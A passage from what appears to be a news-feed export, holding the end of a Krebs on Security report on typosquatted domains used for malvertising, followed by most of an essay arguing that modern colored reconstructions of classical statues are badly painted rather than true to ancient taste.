<div id="attachment_72862"><p><a href="https://krebsonsecurity.com/wp-content/uploads/2025/12/scotaibank.png" target="_blank" rel="noopener"><img aria-describedby="caption-attachment-72862" decoding="async" loading="lazy" src="https://krebsonsecurity.com/wp-content/uploads/2025/12/scotaibank.png" alt="" width="747" height="397" srcset="https://krebsonsecurity.com/wp-content/uploads/2025/12/scotaibank.png 990w, https://krebsonsecurity.com/wp-content/uploads/2025/12/scotaibank-768x408.png 768w, https://krebsonsecurity.com/wp-content/uploads/2025/12/scotaibank-782x415.png 782w" sizes="(max-width: 747px) 100vw, 747px"></a></p><p id="caption-attachment-72862">Samples of redirection paths when visiting scotaibank dot com. Each branch includes a series of domains observed, including the color-coded landing page. Image: Infoblox.</p></div>
<p>Infoblox said a different threat actor who owns <strong>domaincntrol[.]com</strong> — a domain that differs from GoDaddy’s name servers by a single character — has long taken advantage of typos in DNS configurations to drive users to malicious websites. In recent months, however, Infoblox discovered the malicious redirect only happens when the query for the misconfigured domain comes from a visitor who is using Cloudflare’s DNS resolvers (1.1.1.1), and that all other visitors will get a page that refuses to load.</p>
<p>The researchers found that even variations on well-known government domains are being targeted by malicious ad networks.</p>
<p>“When one of our researchers tried to report a crime to the FBI’s <strong>Internet Crime Complaint Center</strong> (IC3), they accidentally visited ic3[.]org instead of ic3[.]gov,” the report notes. “Their phone was quickly redirected to a false ‘Drive Subscription Expired’ page. They were lucky to receive a scam; based on what we’ve learnt, they could just as easily receive an information stealer or trojan malware.”</p>
<p>The Infoblox report emphasizes that the malicious activity they tracked is not attributed to any known party, noting that the domain parking or advertising platforms named in the study were not implicated in the malvertising they documented.</p>
<p>However, the report concludes that while the parking companies claim to only work with top advertisers, the traffic to these domains was frequently sold to affiliate networks, who often resold the traffic to the point where the final advertiser had no business relationship with the parking companies.</p>
<p>Infoblox also pointed out that recent policy changes by <strong>Google</strong> may have inadvertently increased the risk to users from direct search abuse. Brunsdon said <strong>Google Adsense</strong> previously defaulted to allowing their ads to be placed on parked pages, but that in early 2025 Google implemented a default setting that had their customers <a href="https://www.msn.com/en-us/news/technology/google-ads-to-remove-parked-domain-placements-by-default/ar-AA1zwYcS?apiversion=v2&amp;noservercache=1&amp;domshim=1&amp;renderwebcomponents=1&amp;wcseo=1&amp;batchservertelemetry=1&amp;noservertelemetry=1#:~:text=drives%20up%20CPCs-,Google%20Ads%20is%20making%20a%20major%20change%20to%20its%20Search,actively%20developed%2C%20starting%20March%2019.&amp;text=SmartAsset-,Details:,their%20account's%20Content%20suitability%20settings" target="_blank" rel="noopener">opt-out by default</a> on presenting ads on parked domains — requiring the person running the ad to voluntarily go into their settings and turn on parking as a location.</p>
											</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Classical statues were not painted horribly (571 pts)]]></title>
            <link>https://worksinprogress.co/issue/were-classical-statues-painted-horribly/</link>
            <guid>46311856</guid>
            <pubDate>Thu, 18 Dec 2025 12:28:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://worksinprogress.co/issue/were-classical-statues-painted-horribly/">https://worksinprogress.co/issue/were-classical-statues-painted-horribly/</a>, See on <a href="https://news.ycombinator.com/item?id=46311856">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><div role="presentation"><p>Here is a Roman statue located in the British Museum:&nbsp;</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-593x1024.png" width="-331" height="-572" sizes="(max-width: 593px) 100vw, 593px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-593x1024.png 593w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-174x300.png 174w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-768x1326.png 768w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-890x1536.png 890w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-402x694.png 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-462x797.png 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-662x1143.png 662w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-722x1246.png 722w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-10.png 927w" alt="Townley Venus, British Museum. 2nd or 3rd century AD.">
          <figcaption>
            <div>
              <p>
                Townley Venus, British Museum. 2nd or 3rd century AD.&nbsp;
              </p>
              <div>
                <p>Image</p>
                <p>
                  Heritage Image Partnership Ltd via Alamy.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p><a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2c2455-a3e0-4f9a-93c8-53354f589f19_2991x3859.png"></a>It depicts the goddess Venus, perhaps originally holding a mirror. Something you will notice about it is that it looks great.&nbsp;</p><a href="https://worksinprogress.co/print"><img src="https://wip.gatspress.com/wp-content/uploads/2025/11/WIP-Cover-Layered-02-1702x1995.png"><div><p><span>Get the print magazine</span></p><hr><p>Subscribe for $100 to receive six beautiful issues per year.</p><p>Subscribe</p></div></a>



<p>Below is a Greek sculpture from half a millennium earlier.</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-819x1024.png" width="417" height="522" sizes="(max-width: 417px) 100vw, 417px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-819x1024.png 819w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-240x300.png 240w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-768x960.png 768w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-1229x1536.png 1229w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-402x503.png 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-462x578.png 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-662x828.png 662w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-722x903.png 722w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-982x1228.png 982w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-1032x1290.png 1032w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16.png 1280w" alt="Antikythera Ephebe, National Archaeological Museum of Athens. Fourth century BC.">
          <figcaption>
            <div>
              <p>
                Antikythera Ephebe, National Archaeological Museum of Athens. Fourth century BC.
              </p>
              <div>
                <p>Image</p>
                <p>
                  Niko Kitsakis via Wikimedia Commons.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>One of the treasures recovered from the first-century BC Antikythera ship­wreck, this statue is composed of bronze with inlaid stone eyes. It has been variously interpreted as representing Paris, Perseus, or a youthful Heracles. What­ever interpretation is correct, it is a stunning work of art.</p>



<p>Here is a detail from <a href="https://en.wikipedia.org/wiki/Villa_of_Livia">a wall painting</a> in Rome. This has undergone two thousand years of wear and tear, but it is still beautiful to us.&nbsp;</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-9.png" width="549" height="351" sizes="(max-width: 549px) 100vw, 549px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-9.png 1024w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-9-300x192.png 300w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-9-768x491.png 768w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-9-402x257.png 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-9-462x296.png 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-9-662x423.png 662w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-9-722x462.png 722w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-9-982x628.png 982w" alt="Detail from the Villa of Livia. First century BC.">
          <figcaption>
            <div>
              <p>
                Detail from the Villa of Livia. First century BC.&nbsp;
              </p>
              <div>
                <p>Image</p>
                <p>
                  Gleb Simonov via Wikimedia Commons.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>There is a general pattern to these observations. Ancient Greek and Roman art tends to look really good today.&nbsp;</p>



<p>This is not a universal rule. The Greeks weren’t always the masters of naturalism that we know: early Archaic <a href="https://en.wikipedia.org/wiki/Kouros">kouroi</a> now seem rather stilted and uneasy. As in all societies, cruder work was produced at the lower end of the market. Art in the peripheral provinces&nbsp;of the Roman Empire was often clearly a clumsy imitation of work at the center. Even so, modern viewers tend to be struck by the excellence of Greek and Roman art. The examples I have given here are far from exceptions. Explore the Naples Archa­eological Museum, the British Museum, the Louvre, or the Metropolitan Museum and you will see that they had tons of this stuff. Still more remarkable, in a way, is the <a href="https://www.metmuseum.org/met-publications/pompeian-frescoes-the-metropolitan-museum-of-art-bulletin-v-45-no-3-winter-1987-88">abundance of good work</a> discovered in Pompeii, a provincial town of perhaps 15,000 people.</p>



<p>Here is another Roman statue, this time depicting the Emperor Augustus. It is called the Augustus of the Prima Porta after the site where it was discovered. Something interesting about this statue is that traces of paint survive on its surface. This is because, like most though not all ancient statues, it was originally painted.</p>


<div>
<figure><img loading="lazy" width="429" height="686" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-10.jpeg" sizes="(max-width: 429px) 100vw, 429px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-10.jpeg 429w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-188x300.jpeg 188w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-10-402x643.jpeg 402w" alt="Augustus of the Prima Porta, Vatican Museums. 1st century AD.">
          <figcaption>
            <div>
              <p>
                Augustus of the Prima Porta, Vatican Museums. 1st century AD.
              </p>
              <div>
                <p>Image</p>
                <p>
                  Justin Bentiinen via Wikimedia Common.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>You were probably already aware of this. The coloring of ancient sculpture has become widely known in recent years as a result of several high profile projects purporting to reconstruct the original appearance of these works – most famously, Vinzenz Brinkmann’s travelling Gods in Color exhibition. This was not news to historians, who have been aware that ancient sculpture was colored (polychromatic) since the 1800s. But it took these striking reconstructions to gal­vanize public interest.</p>



<p>Here is Brinkmann’s well-known reconstruction of the Augustus of the Prima Porta.</p>


<div>
<figure><img loading="lazy" width="541" height="720" src="https://wip.gatspress.com/wp-content/uploads/2025/12/mptkk3__1__720.jpg" sizes="(max-width: 541px) 100vw, 541px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/mptkk3__1__720.jpg 541w, https://wip.gatspress.com/wp-content/uploads/2025/12/mptkk3__1__720-225x300.jpg 225w, https://wip.gatspress.com/wp-content/uploads/2025/12/mptkk3__1__720-402x535.jpg 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/mptkk3__1__720-462x615.jpg 462w" alt="Reconstruction of the Augustus of the Prima Porta, Vinzenz Brinkmann. First exhibited 2003">
          <figcaption>
            <div>
              <p>
                Reconstruction of the Augustus of the Prima Porta, Vinzenz Brinkmann. First exhibited 2003
              </p>
              <div>
                <p>Image</p>
                <p>
                  Heritage Image Partnership Ltd via Alamy.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>What do you notice about this reconstruction? That’s right, it looks awful. In the eyes of modern viewers, at least, the addition of this matte, heavily saturated color has turned a really good work of art into a really bad one.&nbsp;</p>



<p>Look at this archer, from the pediment of the late archaic temple of Aphaia on Aegina.</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-11.jpeg" width="-241" height="-209" sizes="(max-width: 769px) 100vw, 769px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-11.jpeg 769w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-11-300x259.jpeg 300w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-11-402x348.jpeg 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-11-462x400.jpeg 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-11-662x572.jpeg 662w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-11-722x624.jpeg 722w" alt="Colored reconstructions of the archer from the Temple of Aphaia in Aegina, c. 500 BC. As with a number of the reconstructions, this">
          <figcaption>
            <div>
              <p>
                Colored reconstructions of the archer from the Temple of Aphaia in Aegina, c. 500 BC. As with a number of the reconstructions, this <a href="https://en.wikipedia.org/wiki/Boxer_at_Rest">differs somewhat from the original in form</a> as well as in having been recolored, which may add to the odd effect.&nbsp;
              </p>
              <div>
                <p>Image</p>
                <p>
                  Aquaplanning via Wikimedia Commons.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>I have not said anything novel here. Everybody knows these reconstructions look awful. The difficult and interesting question is why this is so.&nbsp;</p>



<h3><strong>The changing taste theory</strong></h3>



<p>The explanation usually given is that modern taste differs from that of the ancient Greeks and Romans. It follows that, if the reconstructions are accurate, their taste must be very alien to ours. The apparent hideousness of ancient colored sculpture strikes us partly because of <a href="https://www.newyorker.com/magazine/2018/10/29/the-myth-of-whiteness-in-classical-sculpture">what it seems to show about the profoundly changeable character of human taste</a>.</p>



<p>It is usually added that we are the victims, here, of a historical accident. Paints deteriorate much more easily than marble. So, when we rediscovered classical sculpture in the Renai­s­sance, we took the monochrome aesthetic to be intentional. As a result, we internalized a deep-seated attachment to an unblemished white image of Greek and Roman art. We became, to use<a href="https://www.amazon.com/Chromophobia-Focus-Contemporary-Issues-Batchelor/dp/1861890745"> David Bachelor’s</a> term, chromo­phobes. It is this accidental association between Greek and Roman art and pristine white marble, we are told, that accounts for the displeasure we feel when we see the statues restored to color.</p>



<p>At least two things about this expla­nation should strike us as odd. First, there actually exist some contemporary images of statues, showing how they appeared in the ancient world. The resemblance between the statues in these pictures and the modern reconstructions is slight. The statues depicted in the ancient artworks appear to be very delicately painted, often with large portions of the surface left white. A well-known example is the depiction of a statue of Mars at the House of Venus in Pompeii.</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-14.jpeg" width="-936" height="-1246" sizes="(max-width: 769px) 100vw, 769px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-14.jpeg 769w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-225x300.jpeg 225w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-402x535.jpeg 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-462x615.jpeg 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-662x882.jpeg 662w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-722x961.jpeg 722w" alt="House of Venus in the Shell, Pompeii. First century AD.">
          <figcaption>
            <div>
              <p>
                House of Venus in the Shell, Pompeii. First century AD.
              </p>
              <div>
                <p>Image</p>
                <p>
                  Carole Raddato via Wikimedia Commons.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>The statues depicted on the north wall of the frigidarium in the House of the Cryptoporticus have an even gentler finish:</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-1024x768.jpeg" width="-706" height="-528" sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-1024x768.jpeg 1024w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-300x225.jpeg 300w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-768x576.jpeg 768w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-1536x1152.jpeg 1536w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-402x302.jpeg 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-462x347.jpeg 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-662x497.jpeg 662w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-722x542.jpeg 722w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-982x737.jpeg 982w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-1032x774.jpeg 1032w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19-1402x1052.jpeg 1402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-19.jpeg 1600w" alt="House of Cryptoporticus, Pompeii. 1st century AD.">
          <figcaption>
            <div>
              <p>
                House of Cryptoporticus, Pompeii. 1st century AD.
              </p>
              <div>
                <p>Image</p>
                <p>
                  &nbsp;Stefano Ravera via Alamy Stock Photo.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>In other cases the colors are richer. Here too, however, the effect is far from ugly. I have given an example of this below a famous mosaic depicting a statue of a boxer, from the Villa San Marco in Stabiae. Note the subtlety of color recorded by the mosaic, in which the boxer is reddened and sunburned on his shoulders and upper chest, but not his pale upper thighs. There is nothing here to suggest that the statues de­picted would have struck a modern viewer as garish.&nbsp;</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-16.jpeg" width="-522" height="-636" sizes="(max-width: 681px) 100vw, 681px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-16.jpeg 681w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-246x300.jpeg 246w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-402x491.jpeg 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-462x564.jpeg 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-16-662x808.jpeg 662w" alt="Villa San Marco, Stabiae. 1st century AD.">
          <figcaption>
            <div>
              <p>
                Villa San Marco, Stabiae. 1st century AD.
              </p>
              <div>
                <p>Image</p>
                <p>
                  Gary Todd via Wikimedia Commons.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>Is there any sculpture depicted in ancient Greek and Roman visual art that resembles the modern reconstructions? To the best of my knowledge, the closest example is the red, blue and yellow visage from the Villa Poppaea at Oplontis.</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-9.jpeg" width="440" height="661" alt="The tragic mask in the Villa Poppaea, Oplontis, 1st century AD.">
          <figcaption>
            <div>
              <p>
                The tragic mask in the Villa Poppaea, Oplontis, 1st century AD.&nbsp;
              </p>
              <div>
                <p>Image</p>
                <p>
                  Wolfgang Rieger via Wikimedia Commons.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>In that case, the treatment really does resemble the approach favored in modern reconstructions. However, the face belongs not to a classical statue but to a theatrical mask, and is grotesque in form as well as in color. It is not strong evidence that a similar approach was taken with normal classical statuary.&nbsp;</p>



<p>Depictions of people in paintings and mosaics also use color very differently to the modern reconstructions of polychrome ancient sculpture. Here are three examples, each of which show a sensitive naturalism that is, if anything, surprisingly close to modern taste. Again, these are not one-offs: countless further examples could be given.&nbsp;</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-1024x993.png" alt="" width="399" height="387" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-1024x993.png 1024w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-300x291.png 300w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-768x744.png 768w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-1536x1489.png 1536w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-402x390.png 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-462x448.png 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-662x642.png 662w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-722x700.png 722w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-982x952.png 982w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-1032x1000.png 1032w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14-1402x1359.png 1402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-14.png 1600w" sizes="(max-width: 399px) 100vw, 399px"></figure></div>

<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-17-939x1024.png" width="413" height="451" sizes="(max-width: 413px) 100vw, 413px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-17-939x1024.png 939w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-17-275x300.png 275w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-17-768x837.png 768w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-17-402x438.png 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-17-462x504.png 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-17-662x722.png 662w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-17-722x787.png 722w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-17-982x1070.png 982w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-17-1032x1125.png 1032w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-17.png 1100w" alt="The Sappho fresco, National Archaeological Museum, Naples, 1st century AD, and Hermes from the House of Vettii, Pompeii, 62-79 CE.">
          <figcaption>
            <div>
              <p>
                The Sappho fresco, National Archaeological Museum, Naples, 1st century AD, and Hermes from the House of Vettii, Pompeii, 62-79 CE.
              </p>
              <div>
                <p>Image</p>
                <p>
                  Carole Raddato via Wikimedia Commons.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>Classical art evolved over the centuries, and some of it looks <a href="https://en.wikipedia.org/wiki/Tomb_of_the_Diver#/media/File:Tomb_of_the_Diver_-_unfolded_view.png">quite</a> <a href="https://en.wikipedia.org/wiki/Basilica_of_Sant%27Ambrogio#/media/File:Il_redentore_tra_i_ss._gervasio_e_protasio,_IV-VIII_secolo,_con_restauri_del_XVIII_secolo,_01.jpg">different</a> from these examples. But it is difficult or impossible to find an ancient picture from any period whose coloring resembles the Brinkmann reconstructions. Of course, we cannot be sure that the&nbsp;Romans colored their statues in the same way they colored their pictures. But it is surely suspicious that their use of color in pictures tends to be beautiful and intuitive to us.</p>



<p>Some indirect evidence is also provided by the uses of color in ancient interior design, as seen below. The intensity of red on the Farnesia walls is striking, but these cases rarely seem grotesque in the way that the sculptural reconstructions do, nor do they seem to manifest a radically foreign taste in color. In all these cases, ancient art is enjoyable despite having retained its original color.</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-1024x673.jpg" width="678" height="446" sizes="(max-width: 678px) 100vw, 678px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-1024x673.jpg 1024w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-300x197.jpg 300w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-768x505.jpg 768w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-1536x1010.jpg 1536w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-2048x1346.jpg 2048w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-402x264.jpg 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-462x304.jpg 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-662x435.jpg 662w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-722x475.jpg 722w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-982x646.jpg 982w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-1032x678.jpg 1032w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-1402x922.jpg 1402w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-1702x1119.jpg 1702w, https://wip.gatspress.com/wp-content/uploads/2025/12/JGP847-1-1-2002x1316.jpg 2002w" alt="Villa of the Farnesina, Rome. 1st century BC.">
          <figcaption>
            <div>
              <p>
                Villa of the Farnesina, Rome. 1st century BC.&nbsp;
              </p>
              <div>
                <p>Image</p>
                <p>
                  Hercules Milas via Alamy.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>Neither, it might be added, do we find it impossible to appreciate the painted statues of cultures beyond ancient Greece and Rome.<sup id="ref-2"></sup> It is true that polychrome sculpture often verges on an uncanny valley effect, but it seldom looks as bad to us as the classical re­con­structions. This is true not only of the polychrome sculpture from post-classic Europe, like that of the Middle Ages, the Renaissance and the Spanish and German Baroque, but of polychrome sculpture from pre-classical and non-Western cultures, like dynastic Egypt or medieval Nepal. Many of these sculptures have an eerie quality. It is perhaps no accident that they were often used in reli­gious rituals, as were the sculptures of antiquity. But they seldom seem distractingly ugly.</p>



<figure><img loading="lazy" width="1024" height="995" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-1024x995.png" sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-1024x995.png 1024w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-300x292.png 300w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-768x746.png 768w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-1536x1492.png 1536w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-402x391.png 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-462x449.png 462w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-662x643.png 662w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-722x702.png 722w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-982x954.png 982w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-1032x1003.png 1032w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-1402x1362.png 1402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20-1702x1654.png 1702w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-20.png 1836w" alt="Clockwise from top left: Virgen de Belen by Pietro Torrigiano; Cabeza de San Pedro de Alcántara; a 16th-century AD statue of the Nepalese Goddess of Dance; and a 14th century BC bust of Nefertiti.">
          <figcaption>
            <div>
              <p>
                Clockwise from top left: Virgen de Belen by Pietro Torrigiano; Cabeza de San Pedro de Alcántara; a 16th-century AD statue of the Nepalese Goddess of Dance; and a 14th century BC bust of Nefertiti.
              </p>
              <div>
                <p>Image</p>
                <p>
                  Jl FilpoC via Wikimedia Commons;José Luis Filpo Cabana via Wikimedia Commons; Metropolitan Museum of Art; Azoor Photo via Alamy.
                </p>
              </div>
            </div>
          </figcaption>
        </figure>



<p>We are thus asked to believe not only that the colored sculpture of Greek and Roman antiquity was distinctive among its art forms in seeming consistently ugly to us, but also that it is distinctive among the colored sculptural tradi­tions of the world in doing so. This seems&nbsp;unlikely to be true.&nbsp;</p>



<h3><strong>The bad painting theory</strong></h3>



<p>We should be doubtful, then, of the idea that modern reconstructions of colored ancient statues seem ugly to us because we do not share Graeco-­Roman taste in color. Ancient de­pict­ions of statues, other ancient depict­ions of people, and other ancient uses of color, all suggest that their feeling for color was not so different to ours. It is also suspicious that other cultures have produced colored sculpture that we readily appreciate. Is there a better explanation of what is going on here?&nbsp;</p>



<p>There is a single explanation for the fact that the reconstructions do not resemble the statues depicted in ancient artworks, the fact that their use of color is un­like that in ancient mosaics and frescoes, and the fact that modern viewers find them ugly. It is that the reconstructions are painted very badly. There is no reason to posit that ancient Europeans had tastes radically unlike ours to explain our dislike of the reconstructions. The Greeks and Romans would have disliked them too, because the reconstructed polychromy is no good.</p>



<p>Two objections might be raised to my proposal. They are, however, easily answered.</p>



<p>First, it might be thought that my explanation cannot be right because the experts who produce the reconstructions know that this is what the statues originally looked like. After all, it might be reasoned that their work is based on a scientific analysis of the paint residues left over from the original finish.&nbsp;</p>



<p>This objection should not worry us. Nobody, to my knowledge, seriously claims that the methods used to produce the reconstructions guarantee a high degree of accuracy. And this should come as no surprise. The paints used in the reconstructions are chemically similar to the trace pigments found on parts of the surface of the originals. However, those pigments formed the underlayer of a finished work to which they bear a very conjectural relationship. Imagine a modern historian trying to reconstruct the Mona Lisa on the basis of a few residual pigments here and there on a largely featureless canvas.</p>



<p>How confident could we be that the result accurately reproduces the original?&nbsp;</p>



<p>This point is not actually disputed by supporters of the reconstructions. For example, Cecilie Brøns, who leads a project on ancient polychromy at the Ny Carlsberg Glyptotek in Copenhagen, praises the reconstructions <a href="https://www.newyorker.com/magazine/2018/10/29/the-myth-of-whiteness-in-classical-sculpture">but notes that</a> ‘reconstructions can be difficult to explain to the public – that these are not exact copies, that we can never know exactly how they looked’.</p>



<p>Second, it might be urged that it makes no difference whether the reconstructions are accurate because there is simply no way to paint the statues, consistent with the pigments that have been left behind, that modern viewers will find beautiful.</p>



<p>But this just isn’t true. It is manifestly possible to paint a classical statue in a manner consistent with the evidence that will look incomparably more beautiful to the modern viewer than the typical reconstructions do. The triumphant examples above from Egypt and Nepal above prove this incontrovertibly.&nbsp;</p>



<h3><strong>Why make a bad reconstruction?</strong></h3>



<p>Why, then, are the reconstructions so ugly? One factor may be that the specialists who execute them lack the skill of classical artists, who had many years of training in a great tradition.&nbsp;</p>



<p>Another may be that they are hampered by conservation doctrines that forbid including any feature in a reconstruction for which there is no direct archaeological evidence. Since underlayers are generally the only element of which traces survive, such doctrines lead to all-underlayer reconstructions, with the overlayers that were obviously originally present excluded for lack of evidence.&nbsp;</p>



<p>If that is the explanation, though, reconstruction specialists have been notably unsuccessful in alerting the public to the fact that colored classical sculpture bore no more resemblance to these reconstructions than the Mona Lisa would to a reconstruction that included only its underlayers. Much of the educated public believes that ancient sculpture looked something like these reconstructions, not that these reconstructions are a highly artificial exercise in reconstructing elements of ancient polychromy for which we have direct archaeological evidence.</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-8.jpeg" width="360" height="490" alt="Reconstruction of a Greek Warrior Head.">
          <figcaption>
            <div>
              <p>
                Reconstruction of a Greek Warrior Head.
              </p>
              <div>
                <p>Image</p>
